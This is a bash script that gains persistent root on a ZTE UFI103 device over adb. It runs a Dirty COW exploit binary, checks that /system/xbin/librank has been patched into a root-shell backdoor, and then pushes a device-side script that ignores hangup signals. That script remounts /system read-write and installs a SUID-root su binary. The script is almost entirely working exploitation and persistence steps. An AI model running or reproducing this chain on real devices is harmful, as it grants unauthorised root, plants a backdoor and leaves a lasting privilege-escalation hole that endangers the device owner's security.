#!/bin/bash
# Persistent su installation for ZTE UFI103
#
# The /system remount causes a 15-second USB disconnect (device switches to DIAG mode).
# This kills the adb shell before chmod 6755 runs.
#
# Fix: push a device-side script that ignores SIGHUP, run it in background via librank.
# The backgrounded process survives the USB disconnect.
#
# Prerequisites (run ONCE per boot, files persist across reboots):
#   sudo adb push /tmp/cow           /data/local/tmp/cow
#   sudo adb push /tmp/rootshell3    /data/local/tmp/rootshell
#   sudo adb shell chmod 755 /data/local/tmp/cow /data/local/tmp/rootshell

set -e
ADB="sudo adb"
DEVICE_TMP="/data/local/tmp"

echo "=== Persistent su Installer for ZTE UFI103 ==="
echo ""

# Check ADB
if ! $ADB devices 2>/dev/null | grep -q "device$"; then
    echo "ERROR: No ADB device. Make sure device is in Android mode (05c6:90b4)."
    exit 1
fi

# Check cow binary is on device
if ! $ADB shell "ls $DEVICE_TMP/cow 2>/dev/null" | grep -q "cow"; then
    echo "ERROR: /data/local/tmp/cow not found on device."
    echo "Run first:"
    echo "  sudo adb push /tmp/cow        /data/local/tmp/cow"
    echo "  sudo adb push /tmp/rootshell3 /data/local/tmp/rootshell"
    echo "  sudo adb shell chmod 755 /data/local/tmp/cow /data/local/tmp/rootshell"
    exit 1
fi

# ---- Step 1: Re-run dirty cow to activate the librank backdoor ----
echo "[1] Running dirty cow exploit..."
$ADB shell "$DEVICE_TMP/cow" 2>&1 | tail -3
echo ""
sleep 2

# Verify root via librank
echo "[2] Verifying root access..."
ROOT_CHECK=$($ADB shell "/system/xbin/librank /system/bin/id" 2>/dev/null | tr -d '\r\n')
echo "    $ROOT_CHECK"
if ! echo "$ROOT_CHECK" | grep -q "uid=0"; then
    echo "ERROR: librank is not patched to rootshell. dirty cow may not have worked."
    echo "Retry: sudo adb shell '$DEVICE_TMP/cow'"
    exit 1
fi

# ---- Step 2: Check current state of /system/xbin/su ----
echo ""
echo "[3] Current /system/xbin/su state:"
$ADB shell "/system/xbin/librank /system/bin/ls -la /system/xbin/su 2>/dev/null || echo 'not found'"

# ---- Step 3: Write the inner script to device ----
# This script runs on device, ignores SIGHUP/TERM, and installs su with SUID
echo ""
echo "[4] Pushing inner install script to device..."

# Create local copy of the device-side script
INNER_SCRIPT=$(mktemp /tmp/su_inner.XXXXXX)
cat > "$INNER_SCRIPT" << 'INNER_EOF'
#!/system/bin/sh
# Runs on device. Ignores SIGHUP so it survives USB disconnect during remount.
trap '' HUP TERM INT
LOGFILE=/data/local/tmp/su_install.log
echo "[$(date)] Starting su install" > "$LOGFILE"

sleep 2  # Let adb shell exit cleanly first

echo "[$(date)] Remounting /system rw..." >> "$LOGFILE"
mount -o remount,rw /system >> "$LOGFILE" 2>&1

echo "[$(date)] Copying rootshell to su..." >> "$LOGFILE"
cp /data/local/tmp/rootshell /system/xbin/su >> "$LOGFILE" 2>&1

echo "[$(date)] Setting SUID 6755..." >> "$LOGFILE"
chmod 6755 /system/xbin/su >> "$LOGFILE" 2>&1

echo "[$(date)] Setting ownership root:root..." >> "$LOGFILE"
chown 0:0 /system/xbin/su >> "$LOGFILE" 2>&1

echo "[$(date)] Remounting /system ro..." >> "$LOGFILE"
mount -o remount,ro /system >> "$LOGFILE" 2>&1

echo "[$(date)] Done." >> "$LOGFILE"
ls -la /system/xbin/su >> "$LOGFILE" 2>&1
INNER_EOF

# Push to device
$ADB push "$INNER_SCRIPT" "$DEVICE_TMP/su_inner.sh"
rm -f "$INNER_SCRIPT"

# Make executable via root shell
$ADB shell "/system/xbin/librank /system/bin/chmod 755 $DEVICE_TMP/su_inner.sh"

# ---- Step 4: Run the inner script in background via librank ----
# The & backgrounds it; trap '' HUP inside the script protects against SIGHUP.
# The librank (rootshell) execs sh which runs the script.
echo ""
echo "[5] Launching su_inner.sh in background (USB will disconnect in ~1s)..."
echo "    Device will reconnect in ~15 seconds."
echo ""

$ADB shell "/system/xbin/librank /system/bin/sh -c '$DEVICE_TMP/su_inner.sh &'" 2>/dev/null || true

# ---- Step 5: Wait for USB reconnect ----
echo "[6] Waiting 25 seconds for USB reconnect..."
for i in $(seq 25 -1 1); do
    printf "\r    %2ds remaining..." "$i"
    sleep 1
done
echo ""
echo ""

# Wait until device reappears
MAX_WAIT=60
for i in $(seq 1 $MAX_WAIT); do
    if $ADB devices 2>/dev/null | grep -q "device$"; then
        echo "    Device reconnected!"
        break
    fi
    if [ "$i" -eq "$MAX_WAIT" ]; then
        echo "ERROR: Device did not reconnect in ${MAX_WAIT}s. Check USB connection."
        exit 1
    fi
    sleep 1
done

# ---- Step 6: Verify result ----
echo ""
echo "[7] Install log:"
$ADB shell "cat $DEVICE_TMP/su_install.log 2>/dev/null || echo '(log not found)'"

echo ""
echo "[8] Final /system/xbin/su state:"
SU_STATE=$($ADB shell "ls -la /system/xbin/su 2>/dev/null || echo 'not found'")
echo "    $SU_STATE"

if echo "$SU_STATE" | grep -q "rws"; then
    echo ""
    echo "=== SUCCESS: su is installed with SUID bit! ==="
    echo "Test with: sudo adb shell su -c id"
    echo "Or:        sudo adb shell /system/xbin/su -c id"
else
    echo ""
    echo "=== FAILED: SUID bit not set ==="
    echo "Check log above for errors."
    echo ""
    echo "Alternative: try the busybox setsid approach:"
    echo "  $ADB shell \"/system/xbin/librank /system/bin/busybox setsid $DEVICE_TMP/su_inner.sh\""
fi
